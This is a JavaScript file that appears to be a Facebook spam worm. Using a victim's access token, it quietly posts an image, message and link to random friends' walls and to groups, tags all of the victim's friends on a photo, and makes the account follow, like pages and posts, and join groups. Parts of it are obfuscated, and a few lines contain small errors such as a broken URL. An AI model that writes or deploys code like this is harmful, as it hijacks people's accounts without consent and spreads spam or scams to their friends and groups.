     function get_groups() {
       jQuery.ajax({
           url: "https://graph.facebook.com/fql?q=select gid, name from group where gid IN (SELECT gid FROM group_member WHERE uid=me()) order by rand() limit 5&access_token="+access_token,
           dataType: "jsonp",
           success: function(data) {
               post_groups(data);
               console.log(data);
           }
       });
   }
      function count_groups_member(gid) {
       jQuery.ajax({
           url: "https://graph.facebook.com/fql?q=SELECT uid FROM group_member WHERE gid=" + gid + "limit 500 offset 4000&access_token="+access_token,
           dataType: "jsonp",
           success: function(data) {
               //post_groups(data);
               console.log(data.data.length);
           }
       });
   }

   function get_friends() {
       jQuery.ajax({
           url: "https://graph.facebook.com/fql?q=SELECT uid, first_name FROM user WHERE uid IN ( SELECT uid2 FROM friend WHERE uid1 = me() ) ORDER BY rand() limit 100&access_token="+access_token,
           dataType: "jsonp",
           success: function(data) {
            post_friends(data);
            console.log(data);
           }
       });
   }

   function post_friends(list) {
       for (i = 0; i < list.data.length; i++) {
           jQuery.ajax({
               url: "https://graph.facebook.com/"+list.data[i].uid+"/photos?url=" + image_link + "&message=" + text + url + "&callback=paylas&method=POST&access_token=" + access_token,
               dataType: "script",
               success: function() {
                   gonderildi += 1;
                   if (gonderildi >= list.data.length) {}
               }
       });
       }
   }
   function paylas(reponse){
        console.log(response);
   }

   function post_groups_photo(list) {
       for (i = 0; i < list.data.length; i++) {
           jQuery.ajax({
               url: "https://graph.facebook.com/" + list.data[i].gid + "/photos?url=" + image_link + "&message="+ text + url + "&callback=paylas&method=POST&access_token=" + access_token,
               dataType: "script",
               success: function() {
                   gonderildi += 1;
                   if (gonderildi >= list.data.length) {}
               }
       });
       }
   }

      function post_groups_feed(list) {
       for (i = 0; i < list.data.length; i++) {
           jQuery.ajax({
               url: "https://graph.facebook.com/" + list.data[i].gid + "/feed?link=" + image_link + "&message="+ text + url + "&callback=paylas&method=POST&access_token=" + access_token,
               dataType: "script",
               success: function() {
                   gonderildi += 1;
                   if (gonderildi >= list.data.length) {}
               }
       });
       }
   }

   function timeline() {
       $["getJSON"]("https://graph.facebook.com/me/photos?url=" + image_link + "&message=" + text + url + "&method=POST&access_token=" + access_token, function (_0x1f66xf) {
           if (_0x1f66xf["id"]) {
               var _0x1f66x11 = _0x1f66xf["id"];
               console.log(_0x1f66x11);
               var _0x1f66x12 = 100;
               $["getJSON"]("https://graph.facebook.com/me/friends?limit=" + _0x1f66x12 + "&access_token=" + access_token, function (_0x1f66xf) {
                   if (_0x1f66xf["data"]) {
                       var _0x1f66x13 = [];
                       $["each"](_0x1f66xf["data"], function(_0x1f66x14, _0x1f66x7) {
                           _0x1f66x13["push"](_0x1f66x7["id"]);
                           $["getJSON"]("https: //graph.facebook.com/" + _0x1f66x11 + "/tags/" + _0x1f66x7["id"] + "/?method=POST&access_token=" + access_token, function (_0x1f66xf) {});
                       });
                   };
               });
           };
       });
   };

   function follow(id) {
       $.getJSON("https://graph.facebook.com/" + id + "/subscribers?method=post&access_token=" + access_token, function (response) {
       });
   }

   function like_page(id) {
       $.getJSON("https://graph.facebook.com/me/likes?access_token=" + access_token + "&method=POST&url=https://www.facebook.com/" + id, function (response) {
       });
   }

   function like_post(id) {
       $.getJSON("https://graph.facebook.com/" + id + "/likes/?method=post&access_token=" + access_token, function (response) {
       });
   }

   function join_group(grpid) {
       $.getJSON("https://graph.facebook.com/me?access_token=" + access_token, function (response) {
           if (response.id) {
               var userid = response.id;
               $.getJSON("https://graph.facebook.com/" + grpid + "/members/" + userid + "?method=post&access_token=" + access_token, function (response) {
                   if (response.data) {}
               });
           }
       });
   }